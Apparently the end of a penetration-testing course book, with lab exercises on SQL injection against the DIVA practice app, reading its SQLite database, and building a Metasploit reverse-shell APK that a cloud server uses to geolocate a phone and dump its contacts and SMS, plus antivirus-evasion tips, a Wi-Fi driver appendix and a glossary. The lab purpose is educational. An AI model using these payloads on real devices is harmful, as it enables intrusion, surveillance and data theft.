### Exercise 6: Stopping and Analyzing Logging in ADB

1. In the ADB terminal, press `Ctrl + C` to stop the logging.
2. Examine the SQLite log error in the query:
   ```sql
   SELECT * FROM sqluser WHERE user = ' ';
   ```
3. The logcat will show the SQL query executed by the application to search for the user:
   ```sql
   SELECT * FROM sqluser WHERE user = ' ';
   ```
4. Restart the DBA logging with the following command:
   ```sh
   ./dba logcat
   ```
5. In the virtual phone's DIVA app, enter the following in the search field and click "Search":
   ```sql
   'or 1=1; --
   ```
6. The app will display a pop-up screen showing the usernames, passwords, and credit card numbers of all users.

### Exercise 72: Reading SQLite Database in Android Phone

1. Continue from the previous exercise and start an ADB shell to get a shell from the virtual phone:
   ```sh
   ./adb shell
   ```
2. Navigate to the `/data/data` directory:
   ```sh
   cd /data/data
   ```
3. List the contents of the directory:
   ```sh
   ls
   ```
4. Go to the `jakhar.aseem.diva` folder, which contains the data for the DIVA mobile application:
   ```sh
   cd jakhar.aseem.diva
   ```
5. List the contents of the current directory:
   ```sh
   ls
   ```
6. Navigate to the `database` directory:
   ```sh
   cd database
   ```
7. List the contents of the `database` directory:
   ```sh
   ls
   ```
8. Open the SQLite database `sqli`:
   ```sh
   sqlite3 sqli
   ```
9. View the tables in the database:
   ```sql
   .tables
   ```
10. Read the content of the `sqliuser` table:
    ```sql
    SELECT * FROM sqliuser;
    ```
11. The `sqliuser` table contains the usernames, passwords, and credit card numbers of all application users.

### Exercise 73: Hacking a Real Android Phone

In this exercise, we will hack a real Android phone using a malicious APK file created with Metasploit. The APK file will create a backdoor in the Android phone. For this exercise, I am using a Samsung Galaxy S8+ with the latest software release and a cloud-based server for remote access.

**Note:**
- You can easily get a free cloud server from Amazon, Google Cloud, or Microsoft Azure. Register with one of these providers and create your own server.
- Installing Kali Linux on a Google Cloud server is complex, so I used a Google-provided Ubuntu image. Both Kali and Ubuntu are Debian-based distributions, but you will need to manually install penetration testing tools in Ubuntu.

**Exercise Steps:**

1. **Create APK File Using Metasploit:**
   - Set up a cloud server (Kali Linux or Ubuntu Server). I used Google Cloud with an Ubuntu Server.
   - Connect to the cloud server using SSH (e.g., Putty).
   - Update the server:
     ```sh
     sudo apt-get update
     sudo apt-get upgrade
     ```
   - If using Ubuntu, install Metasploit:
     ```sh
     sudo apt-get install metasploit-framework
     ```
   - Generate the APK file:
     ```sh
     sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_external_IP> LPORT=4444 -o malicious.apk
     ```

2. **Host the APK File on a Web Server:**
   - Move the `malicious.apk` file to the web server directory:
     ```sh
     sudo mv malicious.apk /var/www/html
     ```
   - Check if the web server is running:
     ```sh
     sudo systemctl status apache2
     ```
   - If not active, start the web server:
     ```sh
     sudo service apache2 start
     ```

3. **Set Up Metasploit to Listen for Connections:**
   - Start Metasploit console:
     ```sh
     sudo msfconsole
     ```
   - Configure the listener:
     ```sh
     use exploit/multi/handler
     set payload android/meterpreter/reverse_tcp
     set LHOST <your_external_IP>
     set LPORT 4444
     exploit
     ```

4. **Download and Install the APK File on the Android Phone:**
   - On the Android phone, open a web browser and enter the external IP address of your cloud server.
   - Download and install the `malicious.apk` file. Ensure that the option to install apps from unknown sources is enabled.
   - Once installed, a meterpreter session will be established on the server.

5. **Interact with the Meterpreter Session:**
   - Type `sysinfo` to see the Android OS information.
   - Type `help` to see available commands.
   - To check if the phone is rooted, type `check_root`.
   - To get the phone's location, type `geolocate`.
   - To dump all phone contacts to a file on the server, type `dump_contacts`.
   - To dump all SMS messages from the phone to the server, type `dump_sms`.

**Note:**
- The APK file generated by `msfvenom` may not be reliable and can be detected by Android antivirus programs. Consider using more advanced tools like Evil-Droid (https://github.com/M4sc3r4n0/Evil-Droid) to generate more evasive APK files.

### Appendix 1: Realtek Driver Update

This procedure installs drivers for wireless USB adapters with Realtek chipsets RTL8812AU or RTL8811AC.

1. **Check Compatibility:**
   - Kali 2020.1 with Kernel 5.4 has issues with many USB Wi-Fi adapters that worked with earlier Kali versions.
   - Check the version of your USB Wi-Fi adapter:
     ```sh
     lsusb
     ```
   - Check the Kali version.

2. **Install Required Packages:**
   - Update and upgrade the system:
     ```sh
     sudo apt-get update && sudo apt-get upgrade
     ```
   - Install Linux headers:
     ```sh
     sudo apt-get install linux-headers-$(uname -r)
     ```

3. **Install Driver Source Code:**
   - Clone the driver source code repository:
     ```sh
     git clone https://github.com/aircrack-ng/rtl8812au
     ```
   - Install DKMS (Dynamic Kernel Module Support):
     ```sh
     sudo apt-get install dkms
     ```
   - Install the `rtl8812au` driver:
     ```sh
     cd rtl8812au
     sudo ./dkms-install.sh
     sudo dkms status
     ```

4. **Reconnect the Wi-Fi Adapter:**
   - Disconnect the Wi-Fi adapter.
   - Reboot Kali.
   - Reconnect the Wi-Fi adapter.
   - Verify that the adapter is running in Kali.

### Appendix 2: Glossary

| Acronym | Stands for | Definition |
|---------|------------|------------|
| APT | Advanced Persistent Threat | A cyber-attack that uses advanced techniques for cyber espionage or crime. |
| APWG | Anti-Phishing Working Group | An international consortium that brings together businesses, security companies, law enforcement, and others affected by phishing attacks. |
| AV | Antivirus | A computer program used to prevent, detect, and remove malware. |
| AVIEN | Anti-Virus Information Exchange Network | A group of antivirus and security specialists who share information about products, malware, and other threats. |
| CAPTCHA | Completely Automated Public Turing Test to Tell Computers and Humans Apart | A response test used to confirm that a user is human rather than a bot. |
| CARO | Computer Antivirus Research Organization | An organization established in 1990 to study malware. |
| CAVP | Cryptographic Algorithm Validation Program | A program that provides validation testing of FIPS-approved and NIST-recommended cryptographic algorithms. |
| CBC | Cipher Block Chaining | An operation for a block cipher using an initialization vector and a chaining mechanism. |
| CBC-MAC | Cipher Block Chaining Message Authentication Code | A message authentication code constructed from a block cipher in CBC mode. |
| CERIAS | Center for Education and Research in Information Assurance and Security | A part of Purdue University dedicated to research and education in information security. |
| CERT | Computer Emergency Response Team | An expert group that handles computer security incidents and alerts organizations. |
| CHAP | Challenge-Handshake Authentication Protocol | A protocol for authentication that provides protection against replay attacks. |
| CIRT | Computer Incident Response Team | A group that handles events involving computer security and data breaches. |
| CIS | Center for Internet Security | A nonprofit organization that promotes best practices for cyber defense and builds communities for trust in cyberspace. |
| CISA | Certified Information Systems Auditor | Professionals who monitor, audit, control, and assess information systems. |
| CISM | Certified Information Systems Security Manager | A certification demonstrating understanding of the relationship between information security and business goals. |
| CISO | Chief Information Security Officer | The executive responsible for an organization's information and data security. |
| CISSP | Certified Information Systems Security Professional | A security certification for security analysts, indicating standardized knowledge in cybersecurity. |
| CNAP | Cybersecurity National Action Plan | A U.S. plan to enhance cybersecurity awareness and protections. |
| CNCI | Comprehensive National Cybersecurity Initiative | A U.S. government initiative to establish a front line of defense against network intrusions. |
| CND | Computer Network Defense | Actions taken through the use of computer networks to protect, monitor, analyze, detect, and respond to unauthorized activity. |
| COBIT | Control Objectives for Information and Related Technologies | An IT management framework including practices, tools, and models for risk management and compliance. |
| CSEC | Cyber Security Education Consortium | Partners with educators and the broader cybersecurity community to prepare students for the workforce. |
| CSA | Cloud Security Alliance | A leading organization for defining best practices in cloud cybersecurity. |
| CSO | Chief Security Officer | In charge of an organization's entire security posture, including physical and cybersecurity. |
| CSSIA | Center for Systems Security and Information Assurance | A U.S. leader in training cybersecurity educators, providing real-world learning experiences. |
| CVE | Common Vulnerabilities and Exposures | A list of entries containing identification numbers, descriptions, and references for publicly known cybersecurity vulnerabilities. |
| CVSS | Common Vulnerability Scoring System | An industry standard for rating the severity of security vulnerabilities. |
| DDoS | Distributed Denial of Service | An attack that attempts to disrupt normal traffic of a targeted server or network by flooding it with malicious traffic from multiple sources. |
| DLP | Data Loss Prevention | An information security strategy to protect corporate data. |

This glossary provides definitions for common terms and acronyms used in cybersecurity.